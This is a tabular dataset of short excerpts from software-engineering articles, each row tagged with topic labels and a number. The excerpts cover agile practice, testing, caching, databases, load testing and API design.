2898,"The boundary conditions of any sufficiently complex system define the systems solution. The universe has been understood this way by physics for many years. It is governed by a small set of equations (as we understand it): the Lagrange equations. They are simple differential equations that model the interactions that govern the entire universe. What makes the universe take the particular *form* that it is in is not the equation but the boundary conditions. Speed of light, charge of electron, gravitational constant, etc all bound the infinite possibilities defined by the standard model and constrain it to the one solution that is our universe.","['Physics', 'Computer Science', 'Software Engineering']",5
2899,So why do I bring this up? Imagine that the specification changed mid way through the development process of the universe. Perhaps the Higgs-boson started falling into a vacuum energy state tomorrow and then all the pent up energy of the metastable energy state of gravity suddenly started to be released. It wouldnt just make stuff less heavy it would tear apart the very fabric of existence in a wave of destruction moving at the speed of light.,"['Physics', 'Computer Science', 'Software Engineering']",5
2900,"Now consider this scenario in terms of moving requirements of a software system. The product manager may think that just a little tweak to the requirements is only going to change the part of the system that made them think of the change, however, experience says it behaves more like the video. Whole sections of code must be refactored, removed, rearranged and written. Databases migrations need to occur or databases dropped completely. Messaging layers need to be replaced, updated or redesigned. Whole sections of the code will be rewritten and thousands of tests that mistakenly enforced the old boundary conditions will fail.","['Physics', 'Computer Science', 'Software Engineering']",13
2901,"So, as creators of software systems what do we do about this issue? Can we continue to let our carefully crafted work be bulldozed repeatedly every time the needs of a product change? I believe the answer is no, and the way to get there isnt necessarily as painful as it sounds. How software systems differ from the universe is in our ability to choose which constraints we want to make. If we let a system constraint be an extremely high cost item, something that is seen not just as a change to a specific behavior of the system but a fundamental change in the entire structure of the system we can start avoiding these seismic shifts. Somewhat like a carbon tax these changes should not be measured merely on the cost to implement directly (E.","['Physics', 'Computer Science', 'Software Engineering']",12
2902,"ISPs, web speed, routers There are quite a few outside influences on your site in the grand scheme of the world wide web and how it works. All of them have the potential to cause a problem. The internet service providers around the world that deliver your email, and show your site. They are businesses that run servers, and they have their own issues at times. How fast are your customers connections? And can you be sure theyre on a reliable connection for making that purchase or loading that page? Customers devices and environments, for example their PC, phone or tablet, and what they have installed, such as third-party plugins on the browser, antivirus software, and ad blockers can impact your site and how it works.","['Web Development', 'Website Support']",17
2903,"In Software Development, artifacts are by-products created during software development. These are generally specifications, models/diagrams, test scripts, designs, prototypes and metrics. Some will refer to artifacts as surviving legacy documents. They generally describe a historical desired to-be state of something that by then has already evolved. Therefore they are no longer all that reliable as these documents are rarely kept in a transparent state. They can be the source of a lot of waste and confusion when they continue to be used as a source for ongoing development. But as they no longer reflect the as-is state of the actual product, it results in all sorts of wasteful malalignments, misconfigurations and miscommunications.","['Agile', 'Scrum', 'Scrum Master', 'Serious Scrum', 'Road To Psmiii']",16
2904,Many organisations have all sorts of dilbertesque rituals. In the office we comfortably participate in all sorts of rituals and contribute happily to the development of by-products. It makes us appear productive after all. We are providing valuable contributions; or so we all like to think. Many have come to value their individual conveyor belt position along the Waterfall production line.,"['Agile', 'Scrum', 'Scrum Master', 'Serious Scrum', 'Road To Psmiii']",0
2905,"The finished product was to be a web tool that scientists in the Chan Zuckerberg Biohub and elsewhere could use to design and analyze CRISPR edits in batch (now live at crispycrunch.czbiohub.org). With rapid advances in the field of genome engineering, scientists are devising ever-larger experiments that require automation to be practical. At the Biohub, Manuel Leonettis team is inserting fluorescent proteins into all 22,000 protein-coding genes in the human genome. Similarly, Ryan Leenay edited 1,521 different genome locations in order to train a model that predicts edit outcomes in immune system T-cells. In order to do experiments of this scale, the scientists needed to automate their manual workflows. Part of CZIs mission is to apply modern engineering and product methods to accelerate biological research.","['API', 'Software Development', 'CRISPR', 'Science', 'Bioinformatics']",5
2906,"Why do software developers care so much about testing? They do that to discover and fix bugs as early as possible. When a bug that is left undiscovered, other parts of the software will be built upon it. Fixing the bug might require fixing these dependent components as well. It gets even more expensive if the bug causes havoc after it has been shipped to the customer. The earlier a bug is discovered, the cheaper it is to fix.","['Work', 'Entrepreneurship', 'Software Development', 'Business', 'Productivity']",13
2907,"So to recap: A user will trigger a slash command in Slack Slack will send an HTTP post request to our slash command endpoint The endpoint will generate a Slack message and send it back to Slack via an Incoming Webhook with another HTTP request The endpoint will return an empty response to the original slash command request To create the Incoming Webhook, once again, start by creating a new custom integration in Slack. What you choose for Post to Channel doesnt really matter. We want the message to get sent back to whichever channel the command came from, and that will get set when the Incoming Webhook payload gets sent. Setting it to @slackbot is a good failsafe. The Descriptive Label, Customize Name, and Customize Icon can be whatever youd like. Youll need the Webhook URL in a few minutes, so keep it handy.","['AWS Lambda', 'Slack', 'Aws Api Gateway']",15
2908,"Youll see a flow diagram that represents this API endpoint. Each part represents a stage in the lifecycle of each request/response that this method will handle. The Method Request is the slash command HTTP post request. The Integration Request is the request that API Gateway will make to whatever service is backing this method (Lambda, etc). API Gateway gives us the opportunity to massage and transform the data from the client before it gets sent to the integration, hence the two-stage approach. The response works similarly, with an Integration Response coming back from the backing service, and then ultimately a Method Response that API Gateway returns to the client.","['AWS Lambda', 'Slack', 'Aws Api Gateway']",11
2909,"If anyone actually wants to know moreand theyre not just being polite, bless their heartsthat means they either work in tech or Im helping them build an app for Salesforces App Exchange. The App Exchange is like Apples App Store, but for business. (And, it came first, believe it or not. My colleagues and I at Appiphony were there for the launch. )These apps run inside Salesforce much like Candy Crush runs on a smartphone. But many modern apps like Docu Sign (highlighted above), Stripe, and Mixpanel have their own infrastructure that processes some key transaction outside of Salesforces cloud. Salesforce refers to these as composite apps.","['Salesforce', 'Appexchange', 'Composite Apps']",16
2910,"Its useful to start the conversation with the data: what information will the composite app bring into Salesforce to enrich the 360 view of the customer? Heres some examples: What subscriptions and invoices are associated with this customer? (Sales Cloud)Which of our training courses have they taken? (Sales and Service Cloud)What financial accounts do they have, whether its cash accounts, investments, or insurance policies? (Financial Services Cloud)What electronic health data have we measured or observed? (Health Cloud)The Salesforce platform has a very deep, robust array of tools non-coders can use to solve business problemsbut almost all of them rely on structured data. Move the right data into Salesforce, and the world is your oyster.","['Salesforce', 'Appexchange', 'Composite Apps']",6
2911,"Frequently, especially when working in larger organizations, different phases of the projects are handled by different teams or even departments. It all starts with the business analysts, who gather requirements. The requirements are then handed over to the designers that produce the mockups for developers. The developers code away and give the results to the QA engineers. If everything is OK, the artifact is sent to the operations teams that deliver it to the end users. This process is treated as a set of discrete steps without any feedback. Because of the lack of communication between the departments, their representatives often dont really understand the goals of others and this leads to misunderstandings and even conflicts.","['Software Development', 'Coding', 'Web Development', 'Technology', 'Careers']",0
2912,"A lot of these differences can be overcome by just paying attention to the work of others. Sit down with your designer and explain him, that implementing a custom checkbox takes a while and that theres a library that offers a different similar checkbox you could reuse. In return, learn the basics of typography and understand why choosing a correct font makes a difference. Develop the same attitudes toward managers, business analysts, QA engineers, support and marketing specialists. Quoting T. Huxley: By learning something from everybody, you will be able to anticipate their needs, shorten the feedback loop and enable more frequent deliveries. Plus it will earn you a lot of love and respect from everybody else.","['Software Development', 'Coding', 'Web Development', 'Technology', 'Careers']",0
2913,"Hiring software developers for them requires a certain degree of trust. People often tend to feel uncomfortable about having to pay a lot of money for something they dont understand. Remember last time you walked into an unfamiliar car repair service and werent sure if you could trust them with your ride? Well, your clients have the same feeling. Except theres no car, theres just a whole bunch of abstract non-tangible concepts which are supposed to somehow materialize into products and revenue. When working with new clients its important to earn their trust. Make sure they understand how you operate and aim to deliver results in smaller but frequent iterations. That way they can see the progress of your work, assess the intermediate results and provide their feedback.","['Software Development', 'Coding', 'Web Development', 'Technology', 'Careers']",0
2914,"Often developers that learn only a single technology rush to apply it to every problem they encounter. Unsurprisingly, this kind of approach leads to sub-optimal results. Instead, when tackling a new problem, pause and think whether the tools at your disposal are really suitable for this kind of work. If you have doubts, investigate a bit and come up with a list of likely superior alternatives. To make it easier, compile a list of questions and assess different options one by one. The questions can be different for each assessment, but it can go along the way of: What platforms or devices must it support? What are the non-functional requirements, such as performance or memory usage? Is buying a license an option, or do you need something free or open-source? Does the solution provide everything you need out of the box, or will you need to write something yourself? Do you have any other limitation, like company policies, legal considerations or a lack of specialists in your team? Answering these questions should help you structure the options in your head and narrow them down to a shortlist of candidates.","['Software Development', 'Coding', 'Web Development', 'Technology', 'Careers']",13
2915,Identify the things you need to test first. Take the fail fast approach and identify the crucial things that you need to evaluate before you can conclude the experiment. Having doubts about the performance of a system? Build a minimal prototype and run a load test. Uncertain about a particular library or integration with an external service? Implement that separately and then build the rest.,"['Software Development', 'Coding', 'Web Development', 'Technology', 'Careers']",13
2916,"IT people often have two common characteristics: we are inventive and we enjoy our work. This sounds like a good thing, but it comes with an awkward side-effect: we tend to come up with our own solutions to problems that have been solved before. So whenever were faced with a choice of whether to use a framework, library or service or to implement it on our own, we tend to choose the latter. And this takes us on the futile journey of reinventing the wheel. Some of the common misbeliefs that lead to this are: Implementing something yourself is easier than learning a 3rd party solution. While this may be a perfectly valid reason, its important not to oversimplify the task at hand. Often, something seems simple in the beginning but turns out to be much more difficult with progress. Eventually, you could end up spending a whole bunch of time handling bugs and edge cases that someone could have handled for you.","['Software Development', 'Coding', 'Web Development', 'Technology', 'Careers']",12
2917,"Code ownership and long-term maintenance will become a problem. Some people fear that if you go with a third party solution, you risk that the project at some point might become abandoned or unusable for whatever reason. The risk of product lock-in is real, and you should consider a possible mitigation strategy. If its an open-source project, would it be possible for you to fork it and maintain by yourself? Or if its a proprietary project, how much would it cost to replace it? Based on these inputs you can make a conscious decision on whether its worth the risk.","['Software Development', 'Coding', 'Web Development', 'Technology', 'Careers']",9
2918,"Strive for improvements not just in technological aspects, but in methodological as well. Just like properly designed and optimized software, a well-established workflow will allow you to work with fewer effort and stress while producing better results. Establishing an effective and efficient work process is not an easy task and there are numerous books and materials available on this topic. But for a start, consider the following areas for improvements: Team and project management methodologies. Since most of us work in teams, its important to adopt a process that improves collaboration and establishes a common work rhythm for everybody. The agile movement in software development has given birth to a number of widely adopted methodologies, such as Scrum or Kanban. They help organize the overall work structure but dont cover everything. There are other methodologies that help you make estimates, prioritize issues, improve communication, etc. Youll need to identify the areas you are struggling with and look for best practices that help address your struggles.","['Software Development', 'Coding', 'Web Development', 'Technology', 'Careers']",12
2919,"Like an orchestra, an effective team must have the same rhythm, but it doesnt mean that everybody must work in an identical manner. Each person has their own preferences and should work in a way that makes them more productive. For example, a lot of people dont like to be disturbed for hours when coding, but I, personally, like to work in short one-two hour bursts with breaks in between (a less strict version of the pomodoro technique). I also dont like to work at home to avoid household-related distractions and prefer to work from an office or a cafe. Find out what works for you and stick to it, but also make sure that your habits dont create problems for other team members.","['Software Development', 'Coding', 'Web Development', 'Technology', 'Careers']",0
2920,"A lot of practices lie on the border between technology and methodology and focus on improving the actual development process. For example, test-driven development and behavior-driven development help keep your code base well structured and tested. Code reviews help reduce defects in the code and also spread knowledge in the team. Continuous integration and continuous delivery ensure an easier and safer deployment process. Use these practices in combination with other organizational methodologies to achieve maximum results.","['Software Development', 'Coding', 'Web Development', 'Technology', 'Careers']",12
2921,"Remember, that theres no process that will work for everybody, you need to trial it in your own environment. Also, make sure that you understand the process completely and implement it correctly. Seek advice from teams that have already gone through the process and benefit from their experience. Dont neglect the software and material tools that will help you to adopt a process. Get a real Kanban board and a modern platform for continuous delivery. Adopting a new process will require effort and can even lead to a short-term loss of productivity. Give it some time and then do an evaluation of whether things have improved.","['Software Development', 'Coding', 'Web Development', 'Technology', 'Careers']",0
2922,A separate thing has to be said on addressing obstacles. Its a common mistake to neglect small nuisances that might not seem important but can actually have a toxic effect on your work. Is your product designer sitting in a separate room or building? This means that it takes a bit more efforts to come over and have a conversation and some things will not be discussed. Is writing a new test difficult? Then a lot of things will not be tested.,"['Software Development', 'Coding', 'Web Development', 'Technology', 'Careers']",0
2923,"First of all, focus on the fundamentals. Even though new technologies appear quite frequently, new fundamental concepts are much more seldom. When learning something new, make sure you understand the underlying ideas that lead to this implementation. Chances are, these ideas are used in other projects as well, and once you encounter something similar, it will be easier for you to get a grasp of it. For example, modern Java Script UI frameworks are based on components, and once you understand how to structure a component-oriented application using React, can use this experience when working Angular. In a similar manner ideas of Redux found their way into Angular, and reactive state management from Angular was implemented for React as Mob X.","['Software Development', 'Coding', 'Web Development', 'Technology', 'Careers']",19
2924,"I remember a long time ago we had an incident in one project that was by my mistake. Weve managed to recover from the incident quite quickly and I remember the client telling me: No matter how good you are, sometimes things will go wrong and in such moments its important to be able to keep your cool and handle the situation with dignity and mutual respect. After the fire is put out, dont focus on finding the scapegoat. This wont help you avoid mistakes in the future, but will spear fear and doubt across the company. Instead, come together with the affected parties and do a common post-mortem. Focus on the things that lead to the problem, figure out why it happened and brainstorm on what you can improve your system or workflow to avoid this problem in the future.","['Software Development', 'Coding', 'Web Development', 'Technology', 'Careers']",0
2925,"The views folder houses your HTML files.assets houses your images, fonts etc. Assets is a free CDN.env is where you keep sensitive credentials like API keys __url__ is the entry point of your node-express __url__ is where you can add or remove node packages. Glitch makes it easy for you to add or remove packages. To add a package click on your __url__ file. At the top left click on the Add package button, search for your package and click Add. Glitch will then download and add the entry to your dependencies. To remove a package simply remove the entry from your dependencies in your __url__ file.","['Nodejs', 'Expressjs', 'Glitch', 'JavaScript', 'API']",7
2926,"If the issue is a controversial one, such as a technical decision that people are very opinionated about, it is good to use a well-known meeting format, and decision mechanisms known to all participants. It is even better if you have a good moderator, such as maybe your Scrum Master. All this you already should have: your already scheduled Sprint Retrospective! A permanent stream of small adaptions is a sign for a healthy Scrum team. These are for example a refactoring on the fly, a small improvement to the build pipeline quickly agreed upon in the Daily, or a new test case introduced into the regression test suite. This is a very good thing, and it should not be postponed until the Retro. The Retro is for those adaptions that need to be discussed and decided upon, and where all team members should be heard.","['Scrum', 'Agile Retrospective', 'Teamwork', 'Scrum Master', 'Self Organization']",1
2927,"Instead of taking the short-term hit to new feature development and getting the tech debt out of the way, the team continues to spend a large chunk of their time working on new features. As new features are released and the tech debt isnt paid down the teams velocity falls. With lower velocity, it takes longer to ship both new features and fixes to the tech debt. The team limps along, working in an unforgiving environment while slowly chipping away at the mountain of tech debt. After a huge amount of time they finally make enough headway that velocity starts to increase. They shift focus back to new development. Their relief is palpable but short-livedas soon as they speed up new feature development the cycle starts again.","['Software Development', 'Agile', 'Product Management', 'Technology', 'Communication']",1
2928,"Often, when software engineering teams grow beyond a point, you find that productivity (defined as the amount of work produced per person) dips. Any feature addition seems to take forever. As you ponder what went wrong, you find solace in this famous quote: So, are you doomed? Is it a waste to even try and add people to an engineering team? The answer was an emphatic no, when we asked STS Prasad, SVP of Engineering at Freshworks, Sourav Sachin, VP of Engineering at Browser Stack and Nakul Aggarwal, CTO and co-founder of Browser Stack. They believe that it is indeed possible to accelerate growth and to increase velocity in proportion (or almost in proportion) to the increase in team size. And thats how they have built two of Indias most successful tech startups.","['Startup', 'Software Engineering', 'Learning', 'Continuous Integration', 'Continuous Delivery']",12
2929,"The first thing that struck me when I started the proceedings was the camaraderie that quickly developed among the engineers. They quickly got comfortable with one other, something that Id thought can never happen with techies. A quick introduction of each of them, meant to be less than a minute each, went on for five to six minutes at times! Whod expect techies to talk for this long? One of the things Id asked them to talk about during their introduction was the problems that were plaguing them. These were their top three concerns: Hiring Hiring Hiring Not at all surprising. But what struck me more was the fact that there were no issues even remotely related to technology. People highlighted annual reviews, processes, team structure etc. But none of the usual SQL vs. No SQL, Node vs. Go, or AWS vs. GCP. Even in the entire five hours of intense interaction after the introductions, not a single tech issue came up.","['Startup', 'Software Engineering', 'Learning', 'Continuous Integration', 'Continuous Delivery']",0
2930,"A wise friend of mine often used to ask, How do you eat a hippopotamus? Looking at our bewildered faces, hed reply, Piece by piece. Nothing could be truer in dealing with tech debt. Never ever take up a rewrite of the entire product at once, instead adopt an incremental approach. The complete rewrite approach typically comes with overly optimistic estimates. The risk and effort in re-testing the entire product is also often overlooked.","['Startup', 'Software Engineering', 'Learning', 'Continuous Integration', 'Continuous Delivery']",12
2931,"The right solution to the first two issues is to hire or strengthen the operations team and customer support, so that these are offloaded from the developers. But dealing with interruptions for new unplanned work is not that easy. There are two kinds of ad-hoc work: Production bugs Urgent feature requests For most people, bug is a nasty word. For engineers, its also a matter of pride, so a bug must be fixed immediately. But in reality, not all bugs need an immediate fix. Objectively evaluating the impact, the probability of occurrence and the percentage of customers affected is a must. Only when fully justified should a bug fix be taken mid-sprint.","['Startup', 'Software Engineering', 'Learning', 'Continuous Integration', 'Continuous Delivery']",13
2932,"But there is still that issue of how to budget for these bugs. One option is to have a separate team (maybe with rotating members) dedicated to this. But this doesnt scale, because you cant expect the members of this team to be an expert or even familiar with all parts of the code. You will find that this maintenance team often consults the original owners of the code, defeating the original purpose of removing distractions. If you expect the maintenance team to do just the first level analysis, then, what you are really missing in your organization is an L2 support team. They are the ones who should be doing the first level analysis, not your development team.","['Startup', 'Software Engineering', 'Learning', 'Continuous Integration', 'Continuous Delivery']",13
2933,"Do invest in the second kind of documentation. Always write down all the things that you dont want to forget. This includes choices considered and why a particular decision was made (so that you dont rack your brain every time you are confronted with the same choices again). It also includes things like flow-charts and state diagrams that are hard to glean from the working product itself. These are something that you can give a new employee to read during their first week at work. These are things that serve as a useful reference, that you go back to often.","['Startup', 'Software Engineering', 'Learning', 'Continuous Integration', 'Continuous Delivery']",0
2934,"Query Language: Cassandras query language (CQL) lacks the expressiveness of SQL. Much of this has to do with some of the limitations brought on by Cassandras architecture. For example, the use of the WHERE clause is limited to primary or clustering keys or fields that have secondary indexes defined on them, otherwise the coordinator would need to retrieve data from every node in the cluster for each query. This is also true of the GROUPBY clause, which was only introduced in Cassandra 3.0. Another significant limitation for many application workflows is that you can only update data using its primary key. These and many other limitations make CQL a poor choice for workloads that require heavy analytical queries or data manipulation on fields beyond the primary and clustering keys.","['Programming', 'Sql', 'Cassandra', 'Engineering', 'Big Data']",8
2935,"This ordered data is passed down to our custom client, which maintains a fairly involved client-side index to perform the filtering and aggregation that is not supported in a performant manner by Cassandras secondary indexes. We maintain a data structure that essentially duplicates Cassandras primary key->metrics mapping and performs filtering and aggregations as we add data from our Cassandra queries. The aggregations and rollups we do on the client side are very simple (min, max, avg, groupby, etc. ), so the vast majority of the query time remains at the database level. (In other words, the client-side index works, but also takes a lot more work. )Unlike Timescale DB, Cassandra does not work well with large batch inserts. In fact, batching as a performance optimization is explicitly discouraged due to bottlenecks on the coordinator node if the transaction hits many partitions. Cassandras default maximum batch size setting is very small at 5KB. Nonetheless, we found that a small amount of batching (batches of 100) actually did help significantly with insert throughput for our dataset, so we used a batch size of 100 for our benchmarks.","['Programming', 'Sql', 'Cassandra', 'Engineering', 'Big Data']",8
2936,"Since writes are sharded across nodes in Cassandra, its replication and consistency profile is a bit different than that of Timescale DB. Timescale DB writes all data to a single primary node which then replicates that data to any connected replicas through streaming replication. Cassandra, on the other hand, shards the writes across the cluster, so no single replica stores all the clusters data. Instead, you define the replication factor for a given keyspace, which determines the number of nodes that will have a copy of each data item. You can further control the consistency of each write transaction on the client side by specifying how many nodes the client waits for the data to be written to. Postgre SQL and Timescale DB similarly offer tunable consistency.","['Programming', 'Sql', 'Cassandra', 'Engineering', 'Big Data']",8
2937,"The storage capacity of the cache can be increased by scaling out or scaling up (in some cases moving from RAM to SSD). Many services perform trillions of queries per day which stresses the network capacity of our caching infrastructure. When we needed to scale the cache either due to storage or network demand, our approach was to provision a new empty cache, dual-write to the existing cache and the new one, and then allow the data to expire in the older cluster after their Time to Live (TTL) value. But for every scale up activity, we had to pay the additional cost of keeping the old cluster and the newly scaled up cluster for the duration of the TTL. This approach didnt suit well for clusters that had items with no expiration time or were not mutated in between. Also, natural warmup of data on nodes that are replaced in one or more replicas can cause cache misses.","['AWS', 'Cache', 'Netflixoss', 'Database', 'Evcache']",8
2938,"The source of the data, i.e. the replica from where the data needs to be copied, can be either provided by the user or the Controller will select the replica with the highest number of items. The Controller will create a dedicated SQS queue which is used as a communication link between the Dumper and the Populator. It then initiates the cache dump on the source replica nodes. While the dump is in progress, the Controller will create a new Populator cluster. The Populator will get the configuration such as SQS queue name and other settings. The Controller will wait until the SQS queue messages are consumed successfully by the Populator. Once the SQS queue is empty, it will destroy the Populator cluster, SQS queue, and any other resources.","['AWS', 'Cache', 'Netflixoss', 'Database', 'Evcache']",11
2939,"Once the max chunk size is reached, the data-chunk is uploaded to S3 and a message containing the S3 URI is written to the SQS queue. The metadata about the data-chunk such as the warm-up id, hostname, S3 URI, dump format, and the key count is kept along with the chunk in S3. This allows independent consumption of the data chunks. The configurable size of the data-chunks, allows them to be consumed as they become available thus not waiting for the entire dump to be completed. As there will be multiple key-chunks in each EVCache node, the data-dump can be done in parallel. The number of parallel threads depends on the available disk space, JVM heap size of the sidecar, and the CPU cores.","['AWS', 'Cache', 'Netflixoss', 'Database', 'Evcache']",11
2940,"When the Controller receives a signal from an EVCache node on startup, it will check if any node in the reported replica has less than its fair share of times, if so it will trigger the warming process. The Controller ensures not to use the reported replica as the source replica. EVCache uses consistent hashing with virtual nodes. The data on a restarted/replaced node is distributed across all nodes in the other replicas, therefore we need to dump data on all nodes. When the Controller initiates dumping it will pass the specific nodes that need to be warmed up and the replica to which they belong to. The Dumper will dump the data only for the keys which will be hashed to specific nodes. The Populator will then consume the data-chunks to populate the data to the specific replica as explained before.","['AWS', 'Cache', 'Netflixoss', 'Database', 'Evcache']",11
2941,"EBS storage: The main bottleneck with current approach dealing with very huge cache is uploading and downloading data-chunks to and from S3. We observe that the S3 network bandwidth gets throttled after a certain period. An alternative better approach would be to use EBS backed storage to store and retrieve data-chunks. The idea is that the Dumper on each node will be able to attach to an EBS volume and dump the data to a known location. The Populator can attach the same EBS volume and do the addition to new replicas. We would need the ability for multiple instances to attach to the same EBS volume, if we want to run the Dumper and the Populator concurrently, in order to do quick warm up.","['AWS', 'Cache', 'Netflixoss', 'Database', 'Evcache']",11
2942,"The solution of course is to never produce a defect. If only the real world were that simple. Learning to test drive and evolving a Do D can help a team continually raise the quality bar and move closer to defect prevention rather than a sole reliance on defect detection. As the team learns, the Do D can change to reflect the new capabilities. Any team that is just learning TDD should not start with a quality standard of 80% automated test code coverage. It is just not realistic, and automated test code coverage may not be the most critical metric to track. Whatever metric you choose, start where you are and then increase the standard as the team develops the capability to meet it.","['Software Development', 'Agile Transformation', 'Agile', 'Tdd', 'Project Management']",13
2943,"The road to agility can sometimes be long and winding. The quality of your code and your products is central to making it successfully. Declare war on your escaped defects! Track the amount of backflow you are experiencing by designating every issue that is uncovered after a team has declared a story done as an escaped defect. Live in the pain of the imperfection and use defects as a forcing function to raise the bar on quality. Hemming and hawing about when a defect should be logged only muddies the waters. If a team said it was done and then more work gets uncovered later, declare it a defect and learn what needs to change in your process, skillset, tooling or whatever in order to prevent similar defects in the future.","['Software Development', 'Agile Transformation', 'Agile', 'Tdd', 'Project Management']",13
2944,"The challenge was to figure out where we can run these tests from to simulate a busy sale period on the website or in other words we needed a reliable load generator. Being big fans of automation we wanted the solution be re-usable, scalable, easy to use/maintain and of course costs matter too. Using a dedicated machine to generate the load wouldve been an overkill as we dont need it on a daily basis. With that being said, it was a no-brainer that were going to containerize our solution. As we already were using Google Cloud Platform, it was easy to make a choice of a cloud provider too. The major inspiration for this adventure was found in the open spaces of Google Cloud Docs here, so that gave us a direction to go.","['Gatling', 'Kubernetes', 'Load Testing', 'Performance Testing']",6
2945,"The last, but not least, piece of the puzzle, was the report analysis. Fortunately, Gatling has a good reporting built-in and its actually one of the reasons we chose this framework. For heavy load generation Gatling docs advise use several Gatling instances hosted on multiple machines to prevent potentially saturating the OS or the network interface controller. In this case running load test from X Gatling instances will result in X reports, which should be somehow aggregated into one. So there is a recipe how to handle it from Gatling team, check! From that point it became a task how to assemble it all together. Without further ado lets go through the setup step by step.","['Gatling', 'Kubernetes', 'Load Testing', 'Performance Testing']",10
2946,"Nishant Roy, Engineer Communication: One of the most important aspects of the technical interview is your ability to communicate with your interviewer. Dont be in a rush to jump straight into writing code. Rather, take some time to think about the problem and share your thoughts out loud. If the question calls for some data structure or system design, the interviewer probably expects a high-level discussion before you actually get started. Its also a good idea to ask clarifying questions to make sure your understanding of the problem aligns with that of the interviewer. For example, running through a few test cases or drawing some figures to illustrate the problem will help you understand exactly whats expected, and it will also highlight your ability to communicate and plan out your work.","['Engineering', 'Technical Interview', 'Recruiting']",0
2947,"Company culture is directly tied to transparency and the way things work. This article explains how culture is directly tied to employee behavior. A group of influential people in a company got together to figure out next steps and future plans. A coach asked them what does a person need to do in order to be promoted? Once everyone pitched in with ideas that ranged from be proactive to always be available, the coach finally said, heres your culture. If you need transparency then it must be a behavior enacted by leaders and that trickles down to every rank of the company.","['Agile', 'Scrum', 'Scrum Master', 'Software Development']",0
2948,"An electronics manufacturer designs a device. It can range from a simple sensor with one function to a complex device with sensors, AI, and applications included. If you have an eco-system of suppliers creating each part of not only the device but the network and the storage and other devices it links to, you start to understand the complexities and challengesparticularly from an IP view. It needs a new and relevant interpretation to make sense.","['Internet of Things', 'Intellectual Property', 'AI', 'Electronics', 'IP']",5
2949,"Lets follow an example from Chip to Cloud to Appand what IP is applicable at each stage. Note: Always work with your IP Counsel on decisions for IP.1- Chip/Silicon Patenting is the strongest protection for chip design and manufacturing processes. Patenting chips falls into 5 primary categories: Structure (how the transistor looks), Method/Process (How it is made), Apparatus (the hardware to make it), Circuits (How it works) and Functions (What is does/How it performs).2Io T Devices Io T devices range from simple sensors to complex devices including hardware, AI, software and data. The hardware is easily protected with patents. When you add software, AI and data to the device and want to protect it, it is a combination of patents, copyright, trade secrets and trademarks. Data comes in many forms, discussed in more detail below.3- Gateways As the solution is mostly software, copyrights, trademarks and in limited situations patents apply. There can also be hardware appliances where patenting applies.4- Networks A network is also a combination of hardware and software to control and route the communications. All forms of IP support networks.5- Cloud The cloud is actually a combination of systems and software. All forms of IP support cloud implementations.6- Applications Applications are software and algorithm based, and can be protected as copyright, trade secrets, and sometimes patents.","['Internet of Things', 'Intellectual Property', 'AI', 'Electronics', 'IP']",16
2950,"On the data side, there are many questions to be answered to find the right protections, and you need to work with your counsel and IP management teams to formulate policies: Who has ownership at all levels? (and what responsibilities do new regulations like GDPR place on this collection?) Will the collected data be anonymized? Does the aforementioned anonymization have impact? How will the data be used? Contract terms need to be flushed out early (who owns, who licenses, exclusivity, geo considerations/privacy, field of use, time limits, etc.) and these are just a few of the areas.","['Internet of Things', 'Intellectual Property', 'AI', 'Electronics', 'IP']",6
2951,"NET stack is of course Visual Studio if you are on Windows. Ive worked with Visual Studio on Windows in the past, but I was never fully convinced about the IDE. Nevertheless, the first IDE for dotnet on Mac OS I tried was Visual Studio for Mac. Its nice that Microsoft makes the effort, but I must admit, I just didnt like it. It looks like they wanted it to look like Xcode (just compare the screenshots from both websites). But Ive never been a fan of Xcode too I am a fan of Visual Studio Code. And with the C# extension (as Microsoft suggests), you could use this as a starting point for dotnet development. For this project however, I wanted to have a full blown IDE, since the Solution contained different projects with some of them using older dotnet dependenciesbecause legacythat I wanted to manage easily.","['Docker', 'Dotnet', 'Dotnet Core', 'Sql Server', 'Macos']",19
2952,"One of the problems where I struggled a lot is database migrations. On Windows, you can run the following in a terminal inside Visual Studio to generate migration files: The dotnet version is: Normally, this should work. Apparently, problems with dotnet ef have existed for some time now. The problem I was having existed because some dependant projects where not dotnet core projects. This stackoverflow thread highlights the problem and possible workarounds. In the end, it was solved by adding the Nuget Package Microsoft.","['Docker', 'Dotnet', 'Dotnet Core', 'Sql Server', 'Macos']",18
2953,"When I tried running the test-suite, I noticed that about 5 percent of the tests were failing. The purpose of these tests was loading and parsing text-files on my local filesystem. The accompanied text-files for testing were all included in the repository, however the path to them was the source of failing tests. The paths where specified as: In Windows, paths with backward slashes work. But on Mac and Linux, paths are written with forward slashes /. Changing these backward slashes to forward slashes fixed the tests on my system. After checking with the other team members, I found out that Windows had no trouble to parse paths with either forward- or backslashes in the dotnet core codebase. So after changing all affected tests, the problem was fixed.","['Docker', 'Dotnet', 'Dotnet Core', 'Sql Server', 'Macos']",18
2954,"The catch is that these tools are just like comments on the internet: if you want them to be useful, you need to be prepared to spend quite a bit of time managing the process and the flow of information. As product manager a big part of my role has become making sure the right people know about things, and the wrong people dont get distracted by things they dont need to be involved in. This needs time and care, and doesnt just happen automatically. The good news is this will still take way less time than back-to-back meetings every day Prioritization and planning of work is difficult under the most ideal circumstances. When youre working on a remote team, the challenges are even bigger. This is where a combination of the right tools and some deliberate time management can make all the difference. The thing is, we know we do better work when all of our teams perspectives are taken into considerationnot just in terms of the details of a project, but also what we should work on.","['Remote Working', 'Product Management', 'Software Development', 'Web Design', 'Work']",0
2955,"So, to be able to be able to clear individual geo-variations easily, you may want to use hashing to partition your Varnish cache: A different approach to have multiple page variants on the same URL is to use Vary header. The big upside here would be one cached object per page, but with multiple variations in Varnish. It is easy to purge such an object in its entirety, that is with all its variants. You dont get to use both approaches at the same time. Only one: so choose your destiny. As each approach has its specifics: To clear all geo-variants of the same page which was hash-ed, you have to send as many PURGE requests, as there are geo-locations you support.","['Geoip', 'Varnish']",11
2956,"This became quite a common problem with endpoint based APIs, sometimes blamed only on REST APIs (In reality, REST specifically is not to blame, and provides ways to avoid this problem). Web APIs facing that problem reacted in a number of different ways. We saw some APIs respond with the simplest solution: adding more endpoints. Take for example an endpoint based API that provides a way to fetch products: To provide the gaming console version of this use case, certain APIs solved the problem this way: With a sufficiently large web API, you can maybe guess what happened with this approach. The number of endpoints used to answer variations on the same use cases exploded, which made the API extremely hard to reason about for developers, very brittle to changes, and generally a pain to maintain and evolve.","['GraphQL', 'Api Development', 'Software Architecture']",11
